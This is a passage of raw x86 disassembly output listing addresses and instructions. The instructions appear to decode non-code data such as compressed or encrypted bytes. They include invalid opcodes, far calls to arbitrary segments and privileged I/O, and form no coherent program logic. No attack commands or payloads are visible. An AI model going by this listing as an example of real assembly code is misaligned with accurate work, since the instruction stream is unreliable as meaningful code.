  444100:	(bad)  
  444102:	daa    
  444103:	dec    edi
  444104:	jbe    0x444152
  444106:	fwait
  444107:	adc    eax,0xacf970e9
  44410c:	scas   eax,DWORD PTR es:[edi]
  44410d:	inc    DWORD PTR [edx-0x60]
  444110:	push   es
  444111:	or     ebx,esp
  444113:	aad    0xd8
  444115:	and    bl,BYTE PTR ds:0x849f41ff
  44411b:	jle    0x4440d9
  44411d:	inc    ebp
  44411e:	sbb    al,BYTE PTR [edi-0x19]
  444121:	dec    edi
  444122:	jnp    0x44413d
  444124:	outs   dx,DWORD PTR ds:[esi]
  444125:	or     ebx,DWORD PTR [esi-0x5b]
  444128:	sbb    bh,BYTE PTR [eax]
  44412a:	aaa    
  44412b:	stos   DWORD PTR es:[edi],eax
  44412c:	addr16 cld 
  44412e:	call   0x60c8:0x6768f1f
  444135:	push   es
  444136:	cld    
  444137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444138:	daa    
  444139:	adc    al,0xc8
  44413b:	push   0xffffffde
  44413d:	inc    ebx
  44413e:	or     BYTE PTR [edx+esi*4+0x5b],al
  444142:	pop    ds
  444143:	leave  
  444144:	inc    esp
  444145:	shl    cl,cl
  444147:	mov    ebx,0x9df2786c
  44414c:	mov    ds:0xaac21a2b,eax
  444151:	ret    0x8b42
  444154:	or     eax,0xb54e85a4
  444159:	lock sbb ah,BYTE PTR [ebp-0x76]
  44415d:	jmp    0xa770:0x7166902b
  444164:	pushf  
  444165:	popa   
  444166:	cwde   
  444167:	ss sahf 
  444169:	scas   eax,DWORD PTR es:[edi]
  44416a:	hlt    
  44416b:	sbb    esi,DWORD PTR [edx-0x566c53]
  444171:	lods   al,BYTE PTR ds:[esi]
  444172:	aas    
  444173:	jo     0x44418d
  444175:	or     dh,dl
  444177:	fild   QWORD PTR [edi+ebp*1-0x10d189af]
  44417e:	fstp   TBYTE PTR [edi-0x1e4a0c4f]
  444184:	fistp  WORD PTR [esi]
  444186:	jp     0x44418f
  444188:	pop    edi
  444189:	iret   
  44418a:	(bad)  
  44418b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44418c:	int3   
  44418d:	arpl   WORD PTR [ebp+0x69e1cb97],di
  444193:	pop    edx
  444194:	mov    DWORD PTR [ebx+0xb4c192e],ecx
  44419a:	push   ebp
  44419b:	into   
  44419c:	cs std 
  44419e:	push   cs
  44419f:	cmp    al,0x91
  4441a1:	repz out dx,eax
  4441a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4441a4:	stc    
  4441a5:	(bad)
  4441a8:	pop    ss
  4441a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4441aa:	jp     0x4441a8
  4441ac:	cli    
  4441ad:	sub    eax,0xfa14a722
  4441b2:	stc    
  4441b3:	pusha  
  4441b4:	int    0x12
  4441b6:	inc    ecx
  4441b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4441b8:	jb     0x44413e
  4441ba:	pushf  
  4441bb:	cli    
  4441bc:	push   esi
  4441bd:	inc    esp
  4441be:	mov    ebx,0xb1d8b25a
  4441c3:	mov    BYTE PTR [edi],ch
  4441c5:	jnp    0x4441cf
  4441c7:	sbb    DWORD PTR [esi+0x66c5b90b],ebx
  4441cd:	or     eax,0xe593cd03
  4441d2:	call   0xcaa2:0xd724500f
  4441d9:	icebp  
  4441da:	mov    al,0x1f
  4441dc:	push   ss
  4441dd:	or     esp,DWORD PTR [ecx]
  4441df:	add    esp,ebx
  4441e1:	sbb    al,0x81
  4441e3:	outs   dx,DWORD PTR ds:[esi]
  4441e4:	into   
  4441e5:	je     0x44417c
  4441e7:	dec    eax
  4441e8:	cdq    
  4441e9:	inc    eax
  4441ea:	sub    al,0x24
  4441ec:	bswap  esi
  4441ee:	dec    edi
  4441ef:	ja     0x44419c
  4441f1:	dec    ebp
  4441f2:	push   edi
  4441f3:	dec    ecx
  4441f4:	jbe    0x444201
  4441f6:	cmp    ecx,DWORD PTR [eax+0x77542292]
  4441fc:	test   BYTE PTR [esp+ebp*8+0x64b4b2bc],ch
  444203:	aad    0x90
  444205:	mov    ecx,0x7635e3eb
  44420a:	push   ss
  44420b:	mov    edx,0x67d05592
  444210:	cmp    edi,eax
  444212:	xchg   DWORD PTR [edx-0x43],eax
  444215:	mov    eax,ds:0x10b2e7ed
  44421a:	into   
  44421b:	push   cs
  44421c:	gs mov ecx,0xbea5996
  444222:	int    0x9d
  444224:	sbb    ah,bl
  444226:	pushf  
  444227:	cld    
  444228:	out    0xd7,eax
  44422a:	je     0x444250
  44422c:	mov    cl,0xa7
  44422e:	(bad)  
  44422f:	hlt    
  444230:	pop    eax
  444231:	mov    cl,0x9e
  444233:	dec    edi
  444234:	sub    BYTE PTR [ebx],dl
  444236:	inc    ebp
  444237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444238:	jns    0x444256
  44423a:	and    ebx,ecx
  44423c:	ds push 0xe
  44423f:	into   
  444240:	mov    dl,BYTE PTR [ebx+ebx*4+0x38]
  444244:	sub    edi,DWORD PTR [eax+0x5a]
  444247:	fdivp  st(5),st
  444249:	dec    esp
  44424a:	sub    ecx,ebp
  44424c:	mov    cl,0xb
  44424e:	mov    ds:0x15b54987,al
  444253:	out    0xa7,al
  444255:	fistp  DWORD PTR [edx+0x1da5311e]
  44425b:	push   0xd5cfbeaa
  444260:	(bad)  
  444261:	or     eax,DWORD PTR [ebp-0x2a]
  444264:	je     0x444222
  444266:	add    eax,DWORD PTR [esi]
  444268:	(bad)  
  44426a:	cwde   
  44426b:	cmp    BYTE PTR ds:0x841ea6cc,dl
  444271:	call   0x2af28275
  444276:	add    BYTE PTR [ebp-0x4d6c8d05],ah
  44427c:	and    BYTE PTR [ebx-0x26],ch
  44427f:	imul   eax,edx,0xa39a9a81
  444285:	sub    DWORD PTR [edi-0x15],esi
  444288:	ss mov ecx,0xd7c1a7f1
  44428e:	retf   0xf5f6
  444291:	fidiv  DWORD PTR [eax+ecx*4]
  444294:	mov    dl,0xf6
  444296:	pop    esi
  444297:	lods   eax,DWORD PTR ds:[esi]
  444298:	repnz mov eax,DWORD PTR [eax]
  44429b:	push   eax
  44429c:	xor    BYTE PTR [edi+ebp*2-0x59],0x49
  4442a1:	mov    cl,0x76
  4442a3:	and    cl,0x59
  4442a6:	dec    esi
  4442a7:	out    0xb2,al
  4442a9:	stos   BYTE PTR es:[edi],al
  4442aa:	jns    0x444312
  4442ac:	inc    DWORD PTR [ebp+0xb82f023]
  4442b2:	xchg   ecx,eax
  4442b3:	fst    st(5)
  4442b5:	cli    
  4442b6:	into   
  4442b7:	sbb    ch,BYTE PTR [esi]
  4442b9:	pop    ecx
  4442ba:	xchg   ecx,eax
  4442bb:	jmp    0xa81a06f0
  4442c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4442c1:	add    esi,DWORD PTR [edx-0x73]
  4442c4:	das    
  4442c5:	mov    ebx,0xae26a758
  4442ca:	fisub  DWORD PTR [edx]
  4442cc:	inc    ecx
  4442cd:	inc    ecx
  4442ce:	cmp    eax,0xd977b22b
  4442d3:	pusha  
  4442d4:	mov    al,0x1
  4442d6:	mov    esi,DWORD PTR [edx+ebx*4]
  4442d9:	or     BYTE PTR [edi+0x50],dl
  4442dc:	in     eax,0x7a
  4442de:	sub    dl,BYTE PTR [eax]
  4442e0:	sbb    ch,BYTE PTR [ebx-0x6d]
  4442e3:	xchg   esi,eax
  4442e4:	int    0x99
  4442e6:	call   0x25bb:0xdc13e744
  4442ed:	fnsave [edi+eiz*4-0x188465cb]
  4442f4:	mov    edi,0xb22140ec
  4442f9:	cmp    esi,eax
  4442fb:	jle    0x44433e
  4442fd:	mov    cl,0x58
  4442ff:	out    0xc1,al
  444301:	or     edx,ebp
  444303:	dec    edx
  444304:	xlat   BYTE PTR ds:[ebx]
  444305:	cmp    al,0x21
  444307:	cld    
  444308:	ret    
  444309:	push   0x36b2e822
  44430e:	pop    esp
  44430f:	jb     0x444389
  444311:	nop
  444312:	int3   
  444313:	leave  
  444314:	mov    ecx,0xf50c6d0b
  444319:	sbb    DWORD PTR [edx],esp
  44431b:	cs mov ah,0xe4
  44431e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44431f:	and    BYTE PTR [edi+0x1f0999f4],0x58
  444326:	(bad)  
  444327:	sbb    cl,dh
  444329:	mov    ebx,0xb118669
  44432e:	int3   
  44432f:	push   ds
  444330:	rol    DWORD PTR [edx+0x3f],cl
  444333:	cdq    
  444334:	dec    esi
  444335:	push   ss
  444336:	call   0xb1df:0x75094a1
  44433d:	pop    ss
  44433e:	and    DWORD PTR [edi+0x768d7105],0xfffffffb
  444345:	nop
  444346:	pop    DWORD PTR [edx]
  444348:	mov    dl,0x68
  44434a:	es dec ecx
  44434c:	inc    ecx
  44434d:	jmp    0x35bbfedb
  444352:	mov    al,ds:0xed33231
  444357:	(bad)  
  444358:	popa   
  444359:	data16 mov bh,BYTE PTR [ecx-0x4e]
  44435d:	shl    bl,1
  44435f:	pop    edx
  444360:	pop    esi
  444361:	adc    ebx,DWORD PTR [edx]
  444363:	call   0x89124ed0
  444368:	xor    al,0x6
  44436a:	dec    edi
  44436b:	aad    0xa
  44436d:	imul   ebx,DWORD PTR [eax+0x33534e4c],0x8beb6141
  444377:	loope  0x44439d
  444379:	or     eax,DWORD PTR [esi-0x36]
  44437c:	retf   
  44437d:	add    eax,0xbf02e0fc
  444382:	call   0x6655:0xaaac079
  444389:	cmp    cl,bl
  44438b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44438c:	(bad)  
  44438e:	or     BYTE PTR [ebx],al
  444390:	push   0x66
  444392:	pop    eax
  444393:	xlat   BYTE PTR ds:[ebx]
  444394:	bnd jle 0x44434b
  444397:	out    dx,eax
  444398:	mov    DWORD PTR [esi+esi*1+0x27],esp
  44439c:	push   esp
  44439d:	lahf   
  44439e:	icebp  
  44439f:	test   BYTE PTR [esi+0x57a72455],dh
  4443a5:	imul   ebp,DWORD PTR [ebx],0x923a0030
  4443ab:	scas   al,BYTE PTR es:[edi]
  4443ac:	int    0xf5
  4443ae:	xchg   esi,eax
  4443af:	fdivr  st,st(4)
  4443b1:	aaa    
  4443b2:	in     al,0x31
  4443b4:	or     BYTE PTR [ecx],cl
  4443b6:	push   0x9d0a9469
  4443bb:	cmp    DWORD PTR [edx-0x1d],esi
  4443be:	jmp    0x500801ad
  4443c3:	fs mov esp,0x7bc71f4b
  4443c9:	cmp    BYTE PTR [edi+eiz*4+0x38],cl
  4443cd:	int    0x38
  4443cf:	pop    esi
  4443d0:	ret    
  4443d1:	mov    bl,0x27
  4443d3:	jmp    0xb6bec08a
  4443d8:	cmc    
  4443d9:	ret    
  4443da:	sbb    BYTE PTR [ecx+0x75a217ce],ch
  4443e0:	int    0xcb
  4443e2:	cwde   
  4443e3:	dec    esp
  4443e4:	call   0x9f3e:0x8bfb3a5d
  4443eb:	mov    edx,0x6ada8ef7
  4443f0:	xchg   edx,eax
  4443f1:	xlat   BYTE PTR ds:[ebx]
  4443f2:	xchg   edx,eax
  4443f3:	cmp    DWORD PTR [esi],0x34
  4443f6:	call   0x5b4c7688
  4443fb:	lods   al,BYTE PTR ds:[esi]
  4443fc:	lea    ecx,[ecx-0x38]
  4443ff:	shl    BYTE PTR [edx-0x3ac7243e],0x8d
  444406:	(bad)  
  444407:	or     BYTE PTR [ebp+0xb],bl
  44440a:	inc    edi
  44440b:	aaa    
  44440c:	out    0xa5,al
  44440e:	les    ebx,FWORD PTR [ecx-0x265f0512]
  444414:	xchg   ecx,eax
  444415:	or     ah,BYTE PTR [ebx+eax*2]
  444418:	push   edi
  444419:	repnz lds esp,FWORD PTR [eax-0x7e]
  44441d:	xchg   edx,eax
  44441e:	mov    bl,0xb9
  444420:	hlt    
  444421:	pop    ebp
  444422:	push   ebp
  444423:	out    0x71,eax
  444425:	sub    BYTE PTR [edi+0x5],0x15
  444429:	push   ebx
  44442a:	jl     0x44447c
  44442c:	mov    dl,0xff
  44442e:	loop   0x444479
  444430:	xchg   DWORD PTR [edi],edx
  444432:	lods   al,BYTE PTR ds:[esi]
  444433:	imul   edx,DWORD PTR [esi-0x6a58588f],0x44f8bc29
  44443d:	xchg   ebx,eax
  44443e:	ficomp WORD PTR [eax-0x4e]
  444441:	out    0xaa,eax
  444443:	mov    eax,0xcc0726c9
  444448:	sub    ecx,DWORD PTR [ebx]
  44444a:	or     dh,BYTE PTR [edi+0x17]
  44444d:	cmp    DWORD PTR [ecx-0x659e4afd],esp
  444453:	and    al,0xf7
  444455:	mov    eax,ds:0x808dc888
  44445a:	lods   al,BYTE PTR ds:[esi]
  44445b:	shl    BYTE PTR [edi+0x17],1
  44445e:	push   ebp
  44445f:	lock xor cl,BYTE PTR [ebx-0x80]
  444463:	push   cs
  444464:	mov    ecx,0xb2cceedd
  444469:	or     BYTE PTR [edi-0x55],ch
  44446c:	dec    ebx
  44446d:	add    BYTE PTR [ecx-0x76cd1563],0x7e
  444474:	inc    edx
  444475:	xor    al,0x54
  444477:	mov    ebx,0x396927b2
  44447c:	(bad)  
  44447d:	loop   0x444457
  44447f:	and    DWORD PTR [edx-0x7f138841],esi
  444485:	push   ecx
  444486:	pushf  
  444487:	or     DWORD PTR [ebx+ecx*1+0x3a],0xffffffc4
  44448c:	iret   
  44448d:	and    BYTE PTR ds:0x9ad9920c,al
  444493:	enter  0x4506,0x54
  444497:	push   es
  444498:	stos   DWORD PTR es:[edi],eax
  444499:	scas   al,BYTE PTR es:[edi]
  44449a:	fldcw  WORD PTR [ecx-0x66a39d9d]
  4444a0:	xor    bl,BYTE PTR [ecx]
  4444a2:	push   ss
  4444a3:	mov    bh,0xbe
  4444a5:	add    BYTE PTR [edx-0xd117bc7],bl
  4444ab:	inc    DWORD PTR [ebp+ebp*4-0xb]
  4444af:	mov    ebx,0x3f751107
  4444b4:	dec    edx
  4444b5:	push   ecx
  4444b6:	adc    ecx,DWORD PTR [edx-0x4e]
  4444b9:	dec    ecx
  4444ba:	add    eax,0xcc558146
  4444bf:	jge    0x444444
  4444c1:	or     ebp,DWORD PTR [eax-0x2b]
  4444c4:	mov    ecx,esi
  4444c6:	sti    
  4444c7:	mov    ?,WORD PTR [eax]
  4444c9:	retf   
  4444ca:	jl     0x44447a
  4444cc:	mov    dl,0xc1
  4444ce:	lahf   
  4444cf:	sbb    DWORD PTR [ebp-0x1b],esp
  4444d2:	or     eax,0xb60bd7fe
  4444d7:	retf   0x6a79
  4444da:	jge    0x44448c
  4444dc:	cmc    
  4444dd:	(bad)  
  4444de:	call   0xf770:0xd626e8d9
  4444e5:	retf   
  4444e6:	push   0xffffffb8
  4444e8:	fwait
  4444e9:	sub    eax,esi
  4444eb:	bound  ebp,QWORD PTR [edx]
  4444ed:	out    dx,eax
  4444ee:	xor    eax,0xad9479a7
  4444f3:	pop    ss
  4444f4:	push   edx
  4444f5:	adc    BYTE PTR [edx+0x34536644],bl
  4444fb:	cli    
  4444fc:	xchg   ecx,eax
  4444fd:	inc    edx
  4444fe:	aam    0x3f
  444500:	shl    DWORD PTR [ecx-0x55],0xa7
  444504:	push   es
  444505:	and    esi,DWORD PTR [ecx+0x1b]
  444508:	xor    DWORD PTR [ebp-0x2e],esi
  44450b:	sbb    cl,al
  44450d:	shl    dl,1
  44450f:	mov    ds:0xa704f58e,al
  444514:	aaa    
  444515:	xchg   ecx,eax
  444516:	jo     0x44458a
  444518:	mov    ss,WORD PTR [edx+0x8]
  44451b:	test   eax,0x1dee19a2
  444520:	adc    dl,BYTE PTR [ebx]
  444522:	pusha  
  444523:	cmp    DWORD PTR [ebx],ebp
  444525:	in     eax,dx
  444526:	call   0x5d94:0xb96fed5
  44452d:	sub    BYTE PTR [edi-0x48],cl
  444530:	sbb    ecx,DWORD PTR [esi+0x77]
  444533:	daa    
  444534:	cmp    ah,BYTE PTR [esi]
  444536:	push   edi
  444537:	pusha  
  444538:	cdq    
  444539:	loopne 0x4444c1
  44453b:	jbe    0x44456f
  44453d:	(bad)  
  44453e:	fwait
  44453f:	outs   dx,DWORD PTR ds:[esi]
  444540:	test   eax,0x5e16260c
  444545:	push   cs
  444546:	add    ecx,DWORD PTR [ebp+0x26]
  444549:	or     edi,DWORD PTR [edx-0x2]
  44454c:	lds    esi,FWORD PTR [edx+0x5777248e]
  444552:	call   0x367c:0xe3fb1ada
  444559:	jg     0x44459e
  44455b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44455c:	mov    ds:0x2f5ccfb3,al
  444561:	mov    WORD PTR [esp+edx*8-0xc03ae4f],?
  444568:	adc    al,0x32
  44456a:	pop    ebx
  44456b:	ja     0x444518
  44456d:	outs   dx,DWORD PTR ds:[esi]
  44456e:	adc    al,0xa7
  444570:	dec    ebp
  444571:	out    0x8c,al
  444573:	push   esp
  444574:	dec    eax
  444575:	mov    ah,0xbb
  444577:	test   al,0xee
  444579:	inc    ecx
  44457a:	lahf   
  44457b:	popf   
  44457c:	imul   ecx,DWORD PTR [ebx+0x5f08e284],0xffffff88
  444583:	idiv   BYTE PTR [eax]
  444585:	or     edi,DWORD PTR [ecx-0x3bfa7852]
  44458b:	inc    edi
  44458c:	jnp    0x444514
  44458e:	call   0xa00f:0x99446fac
  444595:	dec    eax
  444596:	mov    WORD PTR [ecx+0x1d],ax
  44459a:	cmp    DWORD PTR [ebx-0x58159dd3],ebx
  4445a0:	sbb    al,0x39
  4445a2:	les    edi,FWORD PTR [ecx]
  4445a4:	mov    ecx,0xb2812ae2
  4445a9:	mov    ecx,0x769697e1
  4445ae:	jecxz  0x4445af
  4445b0:	or     al,0x71
  4445b2:	xchg   esi,eax
  4445b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4445b4:	jne    0x444556
  4445b6:	(bad)  
  4445b7:	cwde   
  4445b8:	sub    DWORD PTR [ebp+0x2],0xd7e99aa6
  4445bf:	ja     0x44457d
  4445c1:	in     al,0xb2
  4445c3:	leave  
  4445c4:	out    0x79,eax
  4445c6:	call   0x270e:0xdd89a7d6
  4445cd:	or     edx,esp
  4445cf:	ss bnd jae 0x44457a
  4445d3:	daa    
  4445d4:	mov    ds,WORD PTR [ecx]
  4445d6:	call   0xdc69:0xc45b5761
  4445dd:	adc    al,0x5b
  4445df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4445e0:	mov    ah,0xa1
  4445e2:	in     eax,dx
  4445e3:	lods   eax,DWORD PTR ds:[esi]
  4445e4:	jmp    0x44460d
  4445e6:	pop    edi
  4445e7:	(bad)  [edx-0x28f9b179]
  4445ed:	retf   
  4445ee:	inc    ebp
  4445ef:	call   0xba1b5127
  4445f4:	mov    cl,0x1a
  4445f6:	dec    eax
  4445f7:	stc    
  4445f8:	loope  0x4445a3
  4445fa:	popf   
  4445fb:	popa   
  4445fc:	or     DWORD PTR [ebx-0x25dd2a90],0xfffffff5
  444603:	sub    DWORD PTR [esi+0x1f54b90b],0x49e82878
  44460d:	cwde   
  44460e:	mov    ah,0xc4
  444610:	mov    al,ds:0x30619aa7
  444615:	and    eax,0xab6ec33
  44461a:	cmp    eax,0xc2095c95
  44461f:	(bad)  
  444620:	mov    bh,0x7b
  444622:	or     al,0xc8
  444624:	mov    dl,0x5c
  444626:	cmp    ecx,DWORD PTR [edx+0x61]
  444629:	nop
  44462a:	mov    ebp,0x8c0b4a27
  44462f:	loop   0x444684
  444631:	mov    ebx,0x1f115a60
  444636:	call   0xcd19:0x3a8a9cfc
  44463d:	pop    edx
  44463e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44463f:	mov    al,ds:0x37bd84d1
  444644:	retf   0x424b
  444647:	xchg   edx,eax
  444648:	push   es
  444649:	(bad)  
  44464a:	xchg   ebp,eax
  44464b:	pop    esi
  44464c:	add    DWORD PTR [esi+0x1e4c06e8],0xffffff9b
  444653:	jnp    0x4446cb
  444655:	arpl   WORD PTR [esi],dx
  444657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444658:	jno    0x4445f3
  44465a:	add    DWORD PTR [edx],eax
  44465c:	jecxz  0x44466b
  44465e:	jns    0x444698
  444660:	mov    dl,0xf0
  444662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444663:	dec    ebx
  444664:	repnz test eax,0x153996be
  44466a:	inc    eax
  44466b:	loope  0x4446dc
  44466d:	dec    eax
  44466e:	cs push ss
  444670:	xor    DWORD PTR [edi+0x6a],ebx
  444673:	fsub   DWORD PTR [edx-0x6c436518]
  444679:	mov    ecx,0x6797a5d0
  44467e:	stos   DWORD PTR es:[edi],eax
  44467f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444680:	popa   
  444681:	lahf   
  444682:	jle    0x444634
  444684:	add    al,0x66
  444686:	dec    edx
  444687:	cmc    
  444688:	test   BYTE PTR ds:0xc61d9a9a,al
  44468e:	xchg   edx,eax
  44468f:	jmp    0x4446f4
  444691:	mov    dh,0xfe
  444693:	mov    al,ds:0x7483fd9a
  444698:	ins    BYTE PTR es:[edi],dx
  444699:	jb     0x44462f
  44469b:	xor    esi,edx
  44469d:	mov    ch,0x3
  44469f:	mov    eax,0x82997d56
  4446a4:	dec    ebp
  4446a5:	push   0x5be20a1
  4446aa:	cld    
  4446ab:	lock imul edi,DWORD PTR [edx+0x3a],0xb28392aa
  4446b3:	mov    cs,esi
  4446b5:	dec    esi
  4446b6:	call   0x2db:0x2be9c75f
  4446bd:	enter  0xa754,0xa8
  4446c1:	or     bh,ah
  4446c3:	std    
  4446c4:	jmp    0xb3961a44
  4446c9:	mov    eax,ds:0x9fbdba7a
  4446ce:	xor    eax,0x50f54a74
  4446d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4446d4:	iret   
  4446d5:	xchg   ecx,eax
  4446d6:	into   
  4446d7:	cdq    
  4446d8:	mov    ds:0xb28525e0,al
  4446dd:	shl    edx,cl
  4446df:	mov    ah,0x4
  4446e1:	cmp    BYTE PTR [eax+0x24],bh
  4446e4:	add    BYTE PTR [ebx],cl
  4446e6:	or     DWORD PTR [ebx-0x703deb1b],eax
  4446ec:	int    0xd9
  4446ee:	call   0x4248:0x3d2bcfe9
  4446f5:	dec    ebp
  4446f6:	iret   
  4446f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4446f8:	mov    eax,0x5ba49c9f
  4446fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4446fe:	fwait
  4446ff:	das    
  444700:	mov    dl,0x62
  444702:	xchg   edx,eax
  444703:	xor    eax,0x74e981ae
  444708:	inc    ebx
  444709:	or     eax,DWORD PTR [eax+0x52be89a0]
  44470f:	xchg   DWORD PTR [eax+esi*2],eax
  444712:	xchg   ebx,eax
  444713:	sbb    dl,cl
  444715:	(bad)  
  444717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444718:	or     DWORD PTR [edx+0x14],0x32
  44471c:	mov    cl,0xb
  44471e:	pop    ss
  44471f:	fcom   st(0)
  444721:	in     eax,0x9c
  444723:	ins    BYTE PTR es:[edi],dx
  444724:	add    eax,0x6d479a2a
  444729:	pop    ecx
  44472a:	stc    
  44472b:	test   DWORD PTR [ecx-0x4be03991],eax
  444731:	or     esp,DWORD PTR [edx+edx*8+0x28]
  444735:	xor    eax,0x9432ffac
  44473a:	call   0xb383:0x1296824f
  444741:	leave  
  444742:	or     al,0xa0
  444744:	ret    
  444745:	sti    
  444746:	addr16 int 0x27
  444749:	fild   DWORD PTR [ebp-0x64d15a0d]
  44474f:	mov    edx,0x67a94a8f
  444754:	mov    ah,dh
  444756:	jmp    0xec9f:0xcabb821b
  44475d:	outs   dx,DWORD PTR ds:[esi]
  44475e:	retf   0xf36
  444761:	add    ecx,eax
  444763:	add    al,0x87
  444765:	mov    al,0x65
  444767:	add    ah,0xb8
  44476a:	call   0x833e:0x5bdf616a
  444771:	or     edi,DWORD PTR [ebx]
  444773:	sbb    edx,DWORD PTR [edx]
  444775:	jnp    0x444785
  444777:	adc    ebx,DWORD PTR [ecx-0x54a265e9]
  44477d:	jle    0x4447fd
  44477f:	cs add ah,0x51
  444783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444784:	push   0xffffffd1
  444786:	cmp    BYTE PTR [esi-0x5b],ch
  444789:	xlat   BYTE PTR ds:[ebx]
  44478a:	dec    ecx
  44478b:	stos   DWORD PTR es:[edi],eax
  44478c:	lods   al,BYTE PTR ds:[esi]
  44478d:	daa    
  44478e:	sbb    ecx,DWORD PTR [edx-0x64eb444e]
  444794:	(bad)  
  444795:	jbe    0x444749
  444797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444798:	ja     0x4447be
  44479a:	shl    DWORD PTR [eax],cl
  44479c:	or     BYTE PTR [eax],bl
  44479e:	fidivr DWORD PTR [edi]
  4447a0:	fs push cs
  4447a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4447a3:	in     eax,dx
  4447a4:	sahf   
  4447a5:	or     al,0xc3
  4447a7:	mov    cl,0x94
  4447a9:	jnp    0x4447d5
  4447ab:	sub    esp,DWORD PTR [ebx-0x51046a7f]
  4447b1:	xchg   esi,eax
  4447b2:	call   0xb0fc:0xb679c903
  4447b9:	stos   BYTE PTR es:[edi],al
  4447ba:	call   0x4c7d:0xc7c35b77
  4447c1:	adc    DWORD PTR [ebp-0x5a],edi
  4447c4:	imul   ebx,DWORD PTR [eax-0x62],0xaf80610d
  4447cb:	out    0x6a,eax
  4447cd:	and    DWORD PTR [edx-0x604c4db0],0x3
  4447d4:	lods   al,BYTE PTR ds:[esi]
  4447d5:	jge    0x444778
  4447d7:	imul   ebx,DWORD PTR [ecx-0x1a9198f5],0xc1290d77
  4447e1:	push   esp
  4447e2:	call   0xe9d6:0xb383558a
  4447e9:	inc    esp
  4447ea:	fisub  WORD PTR [edi-0x7b4139be]
  4447f0:	sbb    DWORD PTR [ebp-0x644d6ee9],0x64
  4447f7:	call   0xb73:0xf51ff7b8
  4447fe:	shl    DWORD PTR [esi],1
  444800:	sub    bl,0x3f
  444803:	push   ds
  444804:	jg     0x444805
  444806:	call   0x7d32:0x7e5386bb
  44480d:	js     0x44482b
  44480f:	test   al,0xc8
  444811:	lds    edx,FWORD PTR [eax-0x1a7e4d2a]
  444817:	and    cl,bh
  444819:	cmp    al,0x9d
  44481b:	push   cs
  44481c:	mov    edx,0x7260b5b4
  444821:	inc    edx
  444822:	jnp    0x44480e
  444824:	xchg   esi,eax
  444825:	or     eax,DWORD PTR [ecx]
  444827:	cmp    al,BYTE PTR ds:0xdc3d20a0
  44482d:	scas   eax,DWORD PTR es:[edi]
  44482e:	out    0x64,eax
  444830:	mov    ss,WORD PTR [edx]
  444832:	mov    esp,0x4bcd49a7
  444837:	idiv   edi
  444839:	out    0x94,al
  44483b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44483c:	fld    TBYTE PTR [ecx-0x21]
  44483f:	sahf   
  444840:	sub    BYTE PTR [ecx-0x4a],cl
  444843:	inc    edi
  444844:	imul   ecx,DWORD PTR [edi],0x40cb879a
  44484a:	push   edi
  44484b:	ins    BYTE PTR es:[edi],dx
  44484c:	in     eax,0xd2
  44484e:	fstp   TBYTE PTR [eax+0x27ccef82]
  444854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444855:	sub    bh,ah
  444857:	or     eax,0x689a65ff
  44485c:	push   ebx
  44485d:	mov    dl,0xd
  44485f:	sar    DWORD PTR ds:[edx],cl
  444862:	lds    esp,FWORD PTR [edi-0x741a8410]
  444868:	adc    BYTE PTR [ecx],0x5f
  44486b:	xor    BYTE PTR [edx+0x219e7444],0xaa
  444872:	pushf  
  444873:	mov    esi,0x3eac09b3
  444878:	cmp    BYTE PTR [ebx+ebp*2+0x1a07d1fb],dh
  44487f:	cwde   
  444880:	pop    ds
  444881:	adc    ebx,DWORD PTR [edx-0x710e235]
  444887:	scas   al,BYTE PTR es:[edi]
  444888:	push   ebx
  444889:	sbb    dl,ch
  44488b:	scas   al,BYTE PTR es:[edi]
  44488c:	mov    fs,WORD PTR [esi-0x49]
  44488f:	fs int 0xb
  444892:	sbb    DWORD PTR [ebx-0x5c0f59c9],ebp
  444898:	icebp  
  444899:	inc    edx
  44489a:	ins    DWORD PTR es:[edi],dx
  44489b:	mov    esp,0xa27d8b9e
  4448a0:	mov    BYTE PTR [ebx],0x9a
  4448a3:	or     DWORD PTR [ecx],ebp
  4448a5:	add    BYTE PTR [edi+edi*4+0x58],dh
  4448a9:	cli    
  4448aa:	mov    cl,0xac
  4448ac:	mov    dh,0x60
  4448ae:	dec    edi
  4448af:	mov    bl,0xb2
  4448b1:	jo     0x44491f
  4448b3:	xor    al,0x6f
  4448b5:	push   es
  4448b6:	test   BYTE PTR [ecx-0x61a50ecf],bl
  4448bc:	hlt    
  4448bd:	inc    edx
  4448be:	in     eax,0x1a
  4448c0:	imul   ecx,DWORD PTR [ebx],0xb400f218
  4448c6:	mov    dh,0x4b
  4448c8:	fild   QWORD PTR [esi]
  4448ca:	call   0x1b17:0xa779dbdc
  4448d1:	dec    edi
  4448d2:	or     al,0xd1
  4448d4:	mov    WORD PTR [ebx+0x26dda7d2],ds
  4448da:	jp     0x444887
  4448dc:	adc    eax,0xb374395e
  4448e1:	rol    bl,0xc3
  4448e4:	cld    
  4448e5:	pop    ss
  4448e6:	xor    bl,BYTE PTR [edx+edx*4-0x77]
  4448ea:	pop    edi
  4448eb:	aam    0x1b
  4448ed:	rep outs dx,DWORD PTR ds:[esi]
  4448ef:	mov    ds:0x9b95d544,al
  4448f4:	xor    bl,cl
